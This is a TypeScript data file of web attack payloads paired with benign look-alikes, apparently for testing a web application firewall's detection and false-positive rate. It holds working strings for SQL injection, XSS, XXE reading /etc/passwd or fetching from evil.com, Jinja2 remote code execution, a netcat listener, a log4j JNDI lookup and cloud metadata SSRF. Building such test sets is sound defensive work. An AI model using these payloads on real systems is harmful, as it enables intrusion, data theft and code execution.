export type PayloadCategory = {
  type: 'ParamCheck' | 'FileCheck' | 'Header';
  payloads: string[];
  falsePayloads: string[];
};

export const PAYLOADS: Record<string, PayloadCategory> = {
  "SQL Injection": {
    type: "ParamCheck",
    payloads: [
      "' OR '1'='1",
      "1; DROP TABLE notablewaftest17 --",
      "admin' --",
      "' OR 1=1--",
      "' OR 'a'='a",
      "' OR 1=1#",
      "' OR 1=1/*",
      "' OR SLEEP(5)--",
      "' OR 1=1 LIMIT 1;--",
      "WAITFOR DELAY '0:0:5'",
      ")) OR EXISTS(SELECT * FROM users WHERE username='admin')--",
      "%2553%2527%2520OR%25201%253D1",  // URL encoded bypass
      "/**/OR/**/1=1",  // Comment bypass
    ],
    falsePayloads: [
      "John O'Connor",
      "It's a beautiful day",
      "SELECT * FROM products WHERE price > 100",
      "user@example.com",
      "What's your name?",
      "SQL query example",
      "Don't worry about it",
      "SELECT name FROM table",
      "ORDER BY name ASC",
      "That's all folks!"
    ]
  },
  "XSS": {
    type: "ParamCheck",
    payloads: [
      "<script>alert('xss')</script>",
      "<img src=x onerror=alert('xss')>",
      "<iframe src=\"javascript:alert('XSS')\"></iframe>",
      "<svg/onload=alert('xss')>",
      "<body onload=alert('xss')>",
      "<a href=javascript:alert('xss')>click</a>",
      "<math href=javascript:alert(1)>",
      "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'",
      "<marquee onstart=alert(1)>",
      "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\"",
      "<input onfocus=alert(1) autofocus>",
    ],
    falsePayloads: [
      "<p>Hello World</p>",
      "<div>Welcome to our site</div>",
      "<img src=\"logo.png\" alt=\"Company Logo\">",
      "<a href=\"https://example.com\">Visit Example</a>",
      "<b>Important Notice</b>",
      "<script src=\"jquery.js\"></script>",
      "<style>body { color: blue; }</style>",
      "<input type=\"text\" name=\"username\">",
      "<h1>Main Title</h1>",
      "Text with <em>emphasis</em> and <strong>bold</strong>"
    ]
  },
  "Path Traversal": {
    type: "ParamCheck",
    payloads: [
      "../../etc/passwd",
      "../../../../../../../etc/passwd",
      "..\\..\\..\\..\\..\\..\\windows\\win.ini",
      "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
      "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"
    ],
    falsePayloads: [
      "images/logo.png",
      "documents/report.pdf",
      "css/styles.css",
      "js/main.js",
      "uploads/file.txt",
      "data/config.json",
      "assets/image.jpg",
      "public/index.html",
      "static/favicon.ico",
      "files/document.docx"
    ]
  },
  "Command Injection": {
    type: "ParamCheck",
    payloads: [
      "$(cat /etc/passwd)",
      "| cat /etc/passwd",
      "; ls -la",
      "& whoami",
      "| id",
      "; ping -c 10 127.0.0.1",
      "| nc -lvp 4444"
    ],
    falsePayloads: [
      "Price: $100",
      "Email: user@domain.com",
      "Command not found",
      "Run & Walk",
      "Tom & Jerry",
      "Q&A Section",
      "AT&T Company",
      "Rock & Roll",
      "Fish & Chips",
      "Black & White"
    ]
  },
  "SSRF": {
    type: "ParamCheck",
    payloads: [
      "http://127.0.0.1/",
      "file:///etc/passwd",
      "http://127.0.0.1/latest/meta-data/",
      "http://localhost:80/",
      "http://0.0.0.0:80/",
      "http://[::1]/",
      "http://example.com@127.0.0.1/",
      "http://169.254.169.254/latest/meta-data/",  // AWS metadata
      "http://[::ffff:127.0.0.1]",  // IPv6 bypass
      "http://127.1",  // Short notation
      "http://0177.0.0.1",  // Octal bypass
      "http://2130706433",  // Decimal bypass
    ],
    falsePayloads: [
      "https://www.google.com/",
      "https://github.com/user/repo",
      "https://api.example.com/v1/data",
      "https://cdn.jsdelivr.net/npm/bootstrap",
      "https://fonts.googleapis.com/css",
      "https://www.youtube.com/watch?v=xyz",
      "https://stackoverflow.com/questions/123",
      "https://docs.microsoft.com/en-us/",
      "https://www.w3schools.com/html/",
      "https://httpbin.org/get"
    ]
  },
  "NoSQL Injection": {
    type: "ParamCheck",
    payloads: [
      "{'$gt':''}",
      '{"$ne":null}',
      '{"username": {"$ne": null}, "password": {"$ne": null}}',
      '{"$where": "this.password == this.passwordConfirm"}',
      '{"$or": [{}, {}]}'
    ],
    falsePayloads: [
      '{"name": "John Doe"}',
      '{"age": 25}',
      '{"email": "user@example.com"}',
      '{"status": "active"}',
      '{"category": "electronics"}',
      '{"price": 99.99}',
      '{"description": "Product description"}',
      '{"tags": ["new", "popular"]}',
      '{"created": "2023-01-01"}',
      '{"count": 10}'
    ]
  },
  "Local File Inclusion": {
    type: "ParamCheck",
    payloads: [
      "php://filter/convert.base64-encode/resource=index.php",
      "/etc/passwd",
      "../../../../../../../../etc/passwd",
      "..\\..\\..\\..\\windows\\win.ini",
      "/proc/self/environ",
      "index.php%00.jpg"  // Null byte injection bypass
    ],
    falsePayloads: [
      "index.php",
      "config.php",
      "header.php",
      "footer.php",
      "functions.php",
      "database.php",
      "admin.php",
      "login.php",
      "register.php",
      "contact.php"
    ]
  },
  "LDAP Injection": {
    type: "ParamCheck",
    payloads: [
      "*)(|(uid=*))",
      "*))(objectClass=*))(|(objectClass=*)",
      "admin)(|(password=*))"
    ],
    falsePayloads: [
      "uid=john.doe",
      "cn=John Doe",
      "mail=user@example.com",
      "ou=Users",
      "dc=example,dc=com",
      "objectClass=person",
      "sn=Smith",
      "givenName=John",
      "displayName=John Smith",
      "memberOf=cn=Admins"
    ]
  },
  "HTTP Request Smuggling": {
    type: "ParamCheck",
    payloads: [
      "Transfer-Encoding: chunked\r\n0\r\n\r\nGARBAGE",
      "0\r\n\r\nGET / HTTP/1.1\r\nHost: example.com"
    ],
    falsePayloads: [
      "Content-Type: application/json",
      "Content-Length: 123",
      "User-Agent: Mozilla/5.0",
      "Accept: text/html",
      "Authorization: Bearer token123",
      "Cache-Control: no-cache",
      "Connection: keep-alive",
      "Host: example.com",
      "Referer: https://example.com",
      "Accept-Language: en-US"
    ]
  },
  "Open Redirect": {
    type: "ParamCheck",
    payloads: [
      "//evil.com",
      "http://evil.com",
      "/\\evil.com",
      "//google.com%2F%2Fevil.com"
    ],
    falsePayloads: [
      "/dashboard",
      "/profile",
      "/settings",
      "/home",
      "/about",
      "/contact",
      "/products",
      "/services",
      "/blog",
      "/login"
    ]
  },
  "Sensitive Files": {
    type: "FileCheck",
    payloads: [
      ".git",
      ".git/config",
      ".gitignore",
      "requirements.txt",
      "composer.json",
      "composer.lock",
      "package.json",
      "package-lock.json",
      "yarn.lock",
      "config.php",
      "wp-config.php",
      ".env",
      "docker-compose.yml",
      "id_rsa",
      "id_rsa.pub",
      "web.config",
      "appsettings.json",
      "database.yml",
      ".htpasswd",
      ".htaccess"
    ],
    falsePayloads: [
      "index.html",
      "style.css",
      "script.js",
      "logo.png",
      "favicon.ico",
      "robots.txt",
      "sitemap.xml",
      "about.html",
      "contact.html",
      "terms.html"
    ]
  },
  "CRLF Injection": {
    type: "ParamCheck",
    payloads: [
      "%0d%0aSet-Cookie: malicious=true",
      "\r\nLocation: http://malicious.com",
      "%0d%0aContent-Length:0"
    ],
    falsePayloads: [
      "Line 1\\nLine 2",
      "First paragraph\\n\\nSecond paragraph",
      "Name: John\\nAge: 30",
      "Address line 1\\nAddress line 2",
      "Comment:\\nThis is a comment",
      "Data\\nMore data",
      "Header\\nContent",
      "Title\\nDescription",
      "Item 1\\nItem 2",
      "Question\\nAnswer"
    ]
  },
  "UTF8/Unicode Bypass": {
    type: "ParamCheck",
    payloads: [
      "\\u0027 OR \\u00271\\u0027=\\u00271",  // Unicode encoded SQL injection
      "%E2%80%98 OR %E2%80%981%E2%80%99=%E2%80%991",  // UTF-8 encoded with fancy quotes
      "Ω OR Ω=Ω"  // Using Unicode omega characters
    ],
    falsePayloads: [
      "Café",
      "naïve",
      "résumé",
      "piñata",
      "Москва",
      "北京",
      "東京",
      "Ñoño",
      "François",
      "Zürich"
    ]
  },
  "XXE": {
    type: "ParamCheck",
    payloads: [
      "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>",
      "<!DOCTYPE data [<!ENTITY % file SYSTEM 'file:///etc/passwd'> %file;]>",
      "<?xml version=\"1.0\"?><foo>&xxe;</foo>",
      "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/hosts'>]><foo>&xxe;</foo>",
      "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://evil.com/evil'>]><foo>&xxe;</foo>",
      "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM 'file:///etc/passwd'> %xxe;]>",
      "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM 'http://evil.com/evil.dtd'> %xxe;]>",
      "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'php://filter/read=convert.base64-encode/resource=index.php'>]><foo>&xxe;</foo>",
      "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///c:/windows/win.ini'>]><foo>&xxe;</foo>",
      "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///dev/random'>]><foo>&xxe;</foo>"
    ],
    falsePayloads: [
      "<?xml version=\"1.0\"?><user><name>John</name><email>john@example.com</email></user>",
      "<?xml version=\"1.0\"?><product><id>123</id><name>Widget</name><price>9.99</price></product>",
      "<?xml version=\"1.0\"?><config><setting>value</setting></config>",
      "<?xml version=\"1.0\"?><data><item>Item 1</item><item>Item 2</item></data>",
      "<?xml version=\"1.0\"?><message>Hello World</message>",
      "<?xml version=\"1.0\"?><response><status>success</status></response>",
      "<?xml version=\"1.0\"?><order><customer>John Doe</customer><total>100.00</total></order>",
      "<?xml version=\"1.0\"?><book><title>Sample Title</title><author>Sample Author</author></book>",
      "<?xml version=\"1.0\"?><note><to>John</to><from>Jane</from><message>Hello</message></note>",
      "<?xml version=\"1.0\"?><catalog><item id=\"1\">Product 1</item></catalog>"
    ]
  },
  "SSTI": {
    type: "ParamCheck",
    payloads: [
      "{{7*7}}",  // Jinja2
      "${7*7}",   // Velocity
      "<%= 7*7 %>", // ERB
      "{{=7*7}}", // Twig
      "#{7*7}",    // Ruby
      "{{7*'7'}}", // Jinja2 string multiplication
      "{{config}}", // Jinja2 variable leak
      "{{self}}",   // Jinja2 self leak
      "{{[].__class__.__mro__[1].__subclasses__()}}", // Jinja2 class leak
      "{{().__class__.__bases__[0].__subclasses__()}}", // Python
      "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}", // Jinja2 RCE
      "<%={{7*7}}%>", // AngularJS
      "${{7*7}}", // Go templates
      "{{request}}", // Flask/Jinja2
      "{{url_for}}", // Flask/Jinja2
      "{{cycler.__init__.__globals__.os.popen('id').read()}}" // Jinja2 RCE
    ],
    falsePayloads: [
      "{{username}}",
      "{{title}}",
      "{{content}}",
      "{{date}}",
      "{{author}}",
      "{{price}}",
      "{{description}}",
      "{{category}}",
      "{{status}}",
      "{{message}}"
    ]
  },
  "HTTP Parameter Pollution": {
    type: "ParamCheck",
    payloads: [
      "param=1&param=2",
      "user=admin&user=guest",
      "id=1;id=2",
      "param=1&&param=2",
      "param=1;param=2",
      "param=1,param=2",
      "param=1 param=2",
      "param=1&param=",
      "param=&param=2",
      "param=1&Param=2",
      "param[0]=1&param[1]=2",
      "param[]=1&param[]=2",
      "param=1&%70%61%72%61%6d=2",
      "param=1&par%61m=2",
      "param.1=1&param.2=2",
      "param=1|param=2",
      "param[a]=1&param[b]=2"
    ],
    falsePayloads: [
      "name=John&email=john@example.com",
      "search=product&category=electronics", 
      "page=1&limit=10",
      "sort=name&order=asc",
      "filter=active&type=user",
      "id=123&status=enabled",
      "query=test&format=json",
      "lang=en&region=us",
      "theme=dark&size=large",
      "start=0&count=20"
    ]
  },
  "Web Cache Poisoning": {
    type: "Header",
    payloads: [
      "X-Forwarded-Host: evil.com",
      "X-Original-URL: /admin",
      "Cache-Control: no-cache",
      "X-Forwarded-Proto: https",
      "X-Host: evil.com",
      "X-Forwarded-Scheme: javascript://",
      "X-HTTP-Method-Override: PURGE",
      "X-Forwarded-Server: evil.com",
      "X-Forwarded-Port: 443",
      "X-Original-Host: evil.com"
    ],
    falsePayloads: [
      "X-Forwarded-Host: www.example.com",
      "X-Original-URL: /public/page",
      "Cache-Control: max-age=3600",
      "X-Forwarded-Proto: https",
      "X-Host: api.example.com",
      "X-Forwarded-Scheme: https",
      "X-HTTP-Method-Override: PUT",
      "X-Forwarded-Server: proxy.example.com",
      "X-Forwarded-Port: 80",
      "X-Original-Host: cdn.example.com"
    ]
  },
  "IP Bypass": {
    type: "Header",
    payloads: [
      "X-Forwarded-For: 127.0.0.1",
      "X-Remote-IP: 127.0.0.1",
      "X-Remote-Addr: 127.0.0.1",
      "X-Client-IP: 127.0.0.1",
      "X-Real-IP: 127.0.0.1",
      "X-Forwarded-For: 127.0.0.1, evil.com",
      "X-Forwarded-For: 127.0.0.1, 2130706433",
      "X-Forwarded-For: 127.0.0.1, localhost",
      "X-Forwarded-For: 127.0.0.1, 0.0.0.0",
      "X-Forwarded-For: 127.0.0.1, ::1",
      "X-Forwarded-For: 127.0.0.1, 0177.0.0.1",
      "X-Forwarded-For: 127.0.0.1, 127.1"
    ],
    falsePayloads: [
      "X-Forwarded-For: 203.0.113.1",
      "X-Remote-IP: 198.51.100.5",
      "X-Remote-Addr: 192.0.2.10",
      "X-Client-IP: 203.0.113.25",
      "X-Real-IP: 198.51.100.100",
      "X-Forwarded-For: 203.0.113.1, 198.51.100.5",
      "X-Forwarded-For: 192.0.2.1, proxy.example.com",
      "X-Forwarded-For: 203.0.113.50",
      "X-Forwarded-For: 198.51.100.200",
      "X-Real-IP: 203.0.113.75"
    ]
  },
  "User-Agent": {
    type: "Header",
    payloads: [
      "User-Agent:", // пустой
      "User-Agent: \x00", // нуль-байт
      "User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)", // Googlebot
      "User-Agent: {{7*7}}", // SSTI
      "User-Agent: <?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>", // XXE
      "User-Agent: <script>alert('xss')</script>", // XSS
      "User-Agent: %0d%0aSet-Cookie: injected=true", // CRLF
      "User-Agent: ' OR '1'='1", // SQLi
      "User-Agent: *)(uid=*))(|(uid=*)", // LDAP
      "User-Agent: ${jndi:ldap://evil.com/a}" // log4j
    ],
    falsePayloads: [
      "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
      "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
      "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
      "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X)",
      "User-Agent: Mozilla/5.0 (Android 11; Mobile; rv:89.0) Gecko/89.0",
      "User-Agent: curl/7.68.0",
      "User-Agent: PostmanRuntime/7.28.0",
      "User-Agent: Python-requests/2.25.1",
      "User-Agent: Go-http-client/1.1",
      "User-Agent: Apache-HttpClient/4.5.13"
    ]
  }
};
